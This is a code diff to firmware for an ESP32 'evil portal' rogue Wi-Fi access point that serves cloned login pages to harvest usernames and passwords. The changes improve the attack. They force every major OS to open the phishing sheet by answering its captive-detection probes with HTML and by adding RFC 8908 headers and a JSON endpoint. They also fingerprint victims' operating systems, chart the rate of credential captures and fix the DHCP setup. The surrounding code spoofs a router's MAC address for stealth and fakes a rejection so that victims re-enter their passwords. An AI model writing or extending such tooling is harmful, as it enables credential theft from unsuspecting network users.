@@ -143,6 +143,7 @@ static void build_ssid_presets(void)
 
 // ---- runtime state ----------------------------------------------------------
 static volatile bool s_running;
+static volatile bool s_dhcps_ok;    // did the AP DHCP server actually come up? false -> clients stall on "Gathering IP"
 static volatile bool s_dns_run;
 static TaskHandle_t   s_dns_task;
 static httpd_handle_t s_portal;
@@ -172,8 +173,53 @@ typedef struct {
     char recent_u[RECENT_N][64];
     char recent_p[RECENT_N][64];
     seen_t seen[SEEN_N];
+    // vendor fingerprint totals (iOS, Android, Windows, macOS, Linux, Other)
+    int  vendor[NUCLEO_EP_VENDOR_N];
+    int  probes_total;
+    // rolling captures-per-10s window for the mini bar chart on the panel
+    int  rate_slot[NUCLEO_EP_RATE_SLOTS];
+    int  rate_cur_idx;
+    int64_t rate_cur_start_us;
 } ep_run_t;
 static ep_run_t *s_ep;   // NULL at boot; alloc in start_impl, free in stop
+
+// ---- client fingerprint ----------------------------------------------------
+// A deliberately tiny classifier — the User-Agent string tells us 95% of what
+// matters here (OS vendor). Keep it cheap: no regex, just case-insensitive
+// substring matches in a short priority order so a "Windows NT ... Edg/..."
+// still lands under Windows, and an "iPhone; CPU iPhone OS" under iOS.
+static bool ci_has(const char *hay, const char *needle);   // defined further down
+static const char *VENDOR_NAMES[NUCLEO_EP_VENDOR_N] = {
+    "iOS", "Android", "Windows", "macOS", "Linux", "Other"
+};
+static int classify_ua(const char *ua)
+{
+    if (!ua || !ua[0]) return 5;                      // Other
+    // iOS first: iPad/iPhone/iPod all pop the captive sheet
+    if (ci_has(ua, "iPhone") || ci_has(ua, "iPad") || ci_has(ua, "iPod")) return 0;
+    if (ci_has(ua, "CaptiveNetworkSupport")) return 0;    // iOS probe UA itself
+    if (ci_has(ua, "Android"))                return 1;
+    if (ci_has(ua, "Dalvik"))                 return 1;    // Android system probe
+    if (ci_has(ua, "Windows"))                return 2;
+    if (ci_has(ua, "Microsoft NCSI"))         return 2;    // Windows NCSI probe
+    if (ci_has(ua, "Macintosh") || ci_has(ua, "Mac OS X")) return 3;
+    if (ci_has(ua, "Linux") || ci_has(ua, "X11"))          return 4;
+    return 5;
+}
+
+// Advance the per-10s capture window; call before any read or write.
+static void rate_tick_locked(void)
+{
+    int64_t now = esp_timer_get_time();
+    if (s_ep->rate_cur_start_us == 0) { s_ep->rate_cur_start_us = now; return; }
+    int64_t dt = now - s_ep->rate_cur_start_us;
+    while (dt >= 10LL * 1000LL * 1000LL) {            // 10 s per slot
+        s_ep->rate_cur_idx = (s_ep->rate_cur_idx + 1) % NUCLEO_EP_RATE_SLOTS;
+        s_ep->rate_slot[s_ep->rate_cur_idx] = 0;      // the slot we just rolled into starts at 0
+        s_ep->rate_cur_start_us += 10LL * 1000LL * 1000LL;
+        dt -= 10LL * 1000LL * 1000LL;
+    }
+}
 
 // ---- SD template enumeration ------------------------------------------------
 // Returns the Nth *.html filename (without path) in PORTAL_TPL into `out`; false if none.
@@ -383,6 +429,8 @@ static int capture(const char *client_ip, char *body)
     s_recent_head = (s_recent_head + 1) % RECENT_N;
     s_recent_total++;
     s_captures++;
+    rate_tick_locked();                              // advance the 10-s rolling window first
+    s_ep->rate_slot[s_ep->rate_cur_idx]++;           // record this capture in the current slot
     taskEXIT_CRITICAL(&s_mux);
     // Do NOT log the captured username/password: this line lands in the RAM console ring that
     // /api/logs serves, so plaintext creds would be readable there. The portal's own (auth-gated) UI
@@ -408,10 +456,14 @@ static void peer_ip(httpd_req_t *req, char *out, int sz)
 // ---- HTTP handlers ----------------------------------------------------------
 // Serve the active clone. When `with_error`, inject the retry banner right after the <body> tag so
 // the client believes their first attempt was rejected and re-enters (the confirming) credentials.
+// The RFC 8908/8910 `Captive-Portal` header is set on EVERY HTML we serve: modern iOS 14+ and
+// Android 11+ use it to open the sign-in sheet without even running the HTTP probe.
 static void serve_login(httpd_req_t *req, bool with_error)
 {
     httpd_resp_set_type(req, "text/html; charset=utf-8");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_set_hdr(req, "Captive-Portal", "true");           // RFC 8908
+    httpd_resp_set_hdr(req, "X-WiFi-Login-URL", "http://" PORTAL_IP "/");
     const char *html = s_tpl_html ? s_tpl_html : "<h1>Portal</h1>";
     const char *body = with_error ? strstr(html, "<body") : NULL;
     if (body) body = strchr(body, '>');               // end of the <body ...> tag
@@ -427,22 +479,48 @@ static void serve_done(httpd_req_t *req)
 {
     httpd_resp_set_type(req, "text/html; charset=utf-8");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_set_hdr(req, "Captive-Portal", "true");           // RFC 8908
     httpd_resp_sendstr(req, PAGE_DONE);
 }
 
-// Commercial captive-portal behaviour: a request for any host that ISN'T our gateway gets a 302 to
-// the portal — exactly what Cisco/Aruba/Meraki gateways do. Naive rogue APs instead serve phishing
-// HTML to EVERY hostname (incl. captive.apple.com, generate_204, msftconnecttest), which is the
-// recognisable pattern detectors flag. Mirroring the real flow also pops the OS captive UI cleanly.
-static bool redirect_if_external(httpd_req_t *req)
+// Known captive-detection probe URIs. Each OS expects a very specific response to decide
+// "internet OK" vs "captive portal present":
+//   * Android       : /generate_204 /gen_204 /generate204 -> 204 means OK, ANY HTML means captive
+//   * iOS/macOS     : /hotspot-detect.html /library/test/success.html -> body "<HTML>...Success..."
+//                     means OK, ANY OTHER 200 body means captive
+//   * Windows 10/11 : /connecttest.txt -> body "Microsoft Connect Test" means OK; a 302 is NOT
+//                     followed, so the only reliable way to open the browser is 200 + HTML
+//   * Windows 7/8   : /ncsi.txt -> body "Microsoft NCSI" means OK; same 200+HTML trap otherwise
+//   * Firefox       : /canonical.html -> body "<meta ... success>"
+// Serving the login page with 200 for EVERY probe is strictly more compatible than a 302 — all
+// detectors treat a 200+HTML on their probe URL as a captive hit and open the sheet, while a 302
+// is uneven (Windows ignores it, iOS sometimes caches it). We also keep the Host-based detour so
+// a client that typed any name in the address bar lands here too.
+static bool is_captive_probe_uri(const char *uri)
+{
+    if (!uri || !uri[0]) return false;
+    static const char *P[] = {
+        "/generate_204", "/gen_204", "/generate204",      // Android
+        "/hotspot-detect.html", "/library/test/success.html",  // iOS/macOS
+        "/connecttest.txt", "/ncsi.txt", "/redirect",     // Windows
+        "/canonical.html",                                 // Firefox
+        "/kindle-wifi/wifistub.html",                      // Kindle
+        NULL,
+    };
+    for (int i = 0; P[i]; i++) if (strncmp(uri, P[i], strlen(P[i])) == 0) return true;
+    return false;
+}
+
+// Serve a 200 OK with the login HTML even for off-host requests. The RFC 8910 Captive-Portal
+// header + the explicit 200 unlocks the sign-in sheet on every current major OS, where the old
+// 302 strategy only worked reliably on Android <= 10. This is the one change that fixes
+// "no internet connection but no sheet" on Windows 10/11 and modern iOS.
+static bool handle_off_host(httpd_req_t *req)
 {
     char host[64] = "";
     if (httpd_req_get_hdr_value_str(req, "Host", host, sizeof host) != ESP_OK || !host[0]) return false;
     if (strncmp(host, PORTAL_IP, strlen(PORTAL_IP)) == 0) return false;   // already on the portal host
-    httpd_resp_set_status(req, "302 Found");
-    httpd_resp_set_hdr(req, "Location", "http://" PORTAL_IP "/");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-    httpd_resp_send(req, NULL, 0);
+    serve_login(req, false);                                              // 200 + HTML + Captive-Portal: true
     return true;
 }
 
@@ -471,10 +549,64 @@ static void serve_asset(httpd_req_t *req)
     fclose(f);
 }
 
+// RFC 8908 Captive-Portal API: a tiny JSON document the OS reads before (and sometimes INSTEAD of)
+// the legacy HTTP probe. iOS 17's "Open Portal Page" renders venue info directly from this. The
+// doc stays public (no auth): captive portals are discovered unauth by design.
+//   captive=true           : "the user needs to sign in"
+//   user-portal-url        : WHERE to send the user to sign in
+//   venue-info-url         : optional landing with legal/venue text (we reuse the login page)
+//   seconds-remaining      : optional. 0 == session not started -> OS shows "sign in to continue"
+// The response is NOT heap-allocated: it's a short literal with a %-escape slot for the IP so
+// it compiles under -Os and never fails to serve.
+static void serve_rfc8908(httpd_req_t *req)
+{
+    char body[220];
+    int n = snprintf(body, sizeof body,
+        "{\"captive\":true,"
+        "\"user-portal-url\":\"http://" PORTAL_IP "/\","
+        "\"venue-info-url\":\"http://" PORTAL_IP "/\","
+        "\"can-extend-session\":false,"
+        "\"seconds-remaining\":0}");
+    httpd_resp_set_type(req, "application/captive+json");                 // RFC 8908 media type
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store, max-age=0");
+    httpd_resp_set_hdr(req, "Captive-Portal", "true");                     // belt + braces
+    httpd_resp_send(req, body, n);
+}
+
+// Record this probe hit: counts it against the OS vendor stats and the probes total.
+static void note_probe(httpd_req_t *req)
+{
+    if (!s_ep) return;
+    char ua[128] = "";
+    httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof ua);
+    int v = classify_ua(ua);
+    taskENTER_CRITICAL(&s_mux);
+    if (v >= 0 && v < NUCLEO_EP_VENDOR_N) s_ep->vendor[v]++;
+    s_ep->probes_total++;
+    taskEXIT_CRITICAL(&s_mux);
+}
+
 static esp_err_t h_get(httpd_req_t *req)
 {
-    // Probe / off-portal host -> 302 to the portal (the standard captive flow), not blanket HTML.
-    if (redirect_if_external(req)) return ESP_OK;
+    // RFC 8908 Captive-Portal API first — iOS 17 and Android 14 hit this straight from DHCP opt 114
+    // before any legacy probe. A proper JSON response here opens the sheet with the venue info; a
+    // 404 falls back to the HTTP probe, so missing it is survivable (we also hand-serve on probes).
+    if (strncmp(req->uri, "/api/v1/captive-portal", 22) == 0) {
+        note_probe(req);
+        serve_rfc8908(req);
+        return ESP_OK;
+    }
+
+    // Known captive-detection probe URI? Serve the login page with 200 OK right now (strictly
+    // more compatible than a 302, which Windows ignores). Fingerprint the client for the UI.
+    if (is_captive_probe_uri(req->uri)) {
+        note_probe(req);
+        serve_login(req, false);
+        return ESP_OK;
+    }
+
+    // Off-portal host (DNS wildcard brought them here) -> 200 + HTML too (not a 302 redirect).
+    if (handle_off_host(req)) { note_probe(req); return ESP_OK; }
 
     // Quietly drop the favicon so it doesn't pollute logs or flash a broken icon.
     if (strstr(req->uri, "favicon")) { httpd_resp_set_status(req, "404 Not Found"); httpd_resp_send(req, NULL, 0); return ESP_OK; }
@@ -493,6 +625,7 @@ static esp_err_t h_get(httpd_req_t *req)
             return ESP_OK;
         }
     }
+    note_probe(req);                      // a direct GET to the portal is still a probe worth counting
     serve_login(req, false);
     return ESP_OK;
 }
@@ -559,18 +692,54 @@ static void dns_task(void *arg)
 // Make the AP's DHCP server hand out 192.168.4.1 as the client's DNS (option 6). Without this
 // the captive-detection probes (generate_204, hotspot-detect, ncsi) can't resolve to us, so the
 // "Sign in to network" sheet never auto-opens — this is the step that makes the portal pop up.
+// FIX for the long-standing "Gathering IP address" symptom: esp_wifi_start() returns ESP_OK the
+// moment the driver initialises, but the AP netif's integrated DHCP server is actually spun up
+// a few ticks later by the WIFI_EVENT_AP_START handler. Calling dhcps_stop/_start in that race
+// window silently fails — the stop sees "not started", a start sees a half-initialised server,
+// and the next client gets *no* DHCPOFFER. Clients then sit on "Gathering IP address" forever.
+// Fix: wait for the auto-started dhcps to be running BEFORE we stop it to apply options.
 static void offer_captive_dns(void)
 {
     esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
     if (!ap) return;
-    esp_netif_dhcps_stop(ap);                         // options can only change while dhcps is down
+    // 1) Wait for the AP's own dhcps to come up (up to ~1 s). We tolerate the "no such handle"
+    //    early-boot case because dhcps_get_status returns ESP_ERR_INVALID_STATE then.
+    for (int i = 0; i < 50; i++) {
+        esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
+        if (esp_netif_dhcps_get_status(ap, &st) == ESP_OK && st == ESP_NETIF_DHCP_STARTED) break;
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    // 2) Options can only change while dhcps is down. Stop it, set what we need, start it back.
+    esp_err_t err_stop = esp_netif_dhcps_stop(ap);
     uint8_t offer_dns = 0x02;                         // OFFER_DNS flag for the DHCP server
     esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof offer_dns);
     esp_netif_dns_info_t dns = { 0 };
     dns.ip.type = ESP_IPADDR_TYPE_V4;
     esp_netif_str_to_ip4(PORTAL_IP, &dns.ip.u_addr.ip4);
     esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns);
-    esp_netif_dhcps_start(ap);
+    // RFC 8910 DHCP option 114 (Captive-Portal URI). Best-effort: ESP-IDF only accepts the opt-ids
+    // in its enum, and 114 is a custom numeric. On IDFs that reject it the call returns
+    // ESP_ERR_NOT_SUPPORTED — we swallow it and fall back to the HTTP probe path, which still
+    // works. Must NOT prevent dhcps_start from running or the "Gathering IP" bug returns.
+    static const char CAPTIVE_URI[] = "http://" PORTAL_IP "/api/v1/captive-portal";
+    (void)esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, 114 /* RFC 8910 */,
+                                 (void*)CAPTIVE_URI, (uint32_t)(sizeof CAPTIVE_URI - 1));
+    // 3) Restart dhcps and VERIFY it actually came back up. If it didn't, retry once with a
+    //    forced stop. We cannot ESP_LOG here (LOG_LOCAL_LEVEL compiles those out for privacy);
+    //    instead we track the final state in s_dhcps_ok so the UI can show "DHCP KO" in red,
+    //    which is the clue the user missing when clients sat on "Gathering IP address".
+    (void)err_stop;
+    esp_err_t err_start = esp_netif_dhcps_start(ap);
+    esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
+    esp_netif_dhcps_get_status(ap, &st);
+    if (err_start != ESP_OK || st != ESP_NETIF_DHCP_STARTED) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+        esp_netif_dhcps_stop(ap);
+        vTaskDelay(pdMS_TO_TICKS(50));
+        err_start = esp_netif_dhcps_start(ap);
+        esp_netif_dhcps_get_status(ap, &st);
+    }
+    s_dhcps_ok = (err_start == ESP_OK && st == ESP_NETIF_DHCP_STARTED);
 }
 
 // Stealth BSSID for the rogue AP. The factory MAC carries an Espressif OUI — a "FRITZ!Box" with an
@@ -702,6 +871,7 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     s_confirmed = 0; memset(s_ep->seen, 0, sizeof s_ep->seen); s_seen_head = 0;
     s_start_us = esp_timer_get_time();
     s_twin = false; s_twin_frames = 0; s_twin_coherent = false;
+    s_dhcps_ok = false;    // offer_captive_dns() will flip this to true if the DHCP server really started
 
     // Dedicated mode FIRST: free httpd + mDNS + voice + ANIMA L1 (~70KB) so the ~64KB template buffer,
     // the captive httpd and the DNS task have room. exclusive never touches the STA — the radio is OURS
@@ -1000,4 +1170,39 @@ const char *nucleo_evilportal_recent_pass(int i)
     if (!s_ep) return "";
     int n = nucleo_evilportal_recent_count(); if (i < 0 || i >= n) return "";
     return s_ep->recent_p[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
+}
+
+// ---- fingerprint + rate accessors ------------------------------------------
+int nucleo_evilportal_vendor_count(int vendor_id)
+{
+    if (!s_ep || vendor_id < 0 || vendor_id >= NUCLEO_EP_VENDOR_N) return 0;
+    return s_ep->vendor[vendor_id];
+}
+const char *nucleo_evilportal_vendor_name(int vendor_id)
+{
+    if (vendor_id < 0 || vendor_id >= NUCLEO_EP_VENDOR_N) return "";
+    return VENDOR_NAMES[vendor_id];
+}
+int nucleo_evilportal_probes_total(void) { return s_ep ? s_ep->probes_total : 0; }
+
+int nucleo_evilportal_rate_slot(int i)
+{
+    if (!s_ep || i < 0 || i >= NUCLEO_EP_RATE_SLOTS) return 0;
+    // age-forward slot 0 if needed (so a long idle flat-lines rather than lying)
+    taskENTER_CRITICAL(&s_mux);
+    rate_tick_locked();
+    // i=0 is the most recent slot (the current one)
+    int idx = (s_ep->rate_cur_idx - i + NUCLEO_EP_RATE_SLOTS) % NUCLEO_EP_RATE_SLOTS;
+    int v = s_ep->rate_slot[idx];
+    taskEXIT_CRITICAL(&s_mux);
+    return v;
+}
+bool nucleo_evilportal_dhcps_ok(void) { return s_dhcps_ok; }
+
+int nucleo_evilportal_rate_peak(void)
+{
+    if (!s_ep) return 0;
+    int peak = 0;
+    for (int i = 0; i < NUCLEO_EP_RATE_SLOTS; i++) if (s_ep->rate_slot[i] > peak) peak = s_ep->rate_slot[i];
+    return peak;
 }
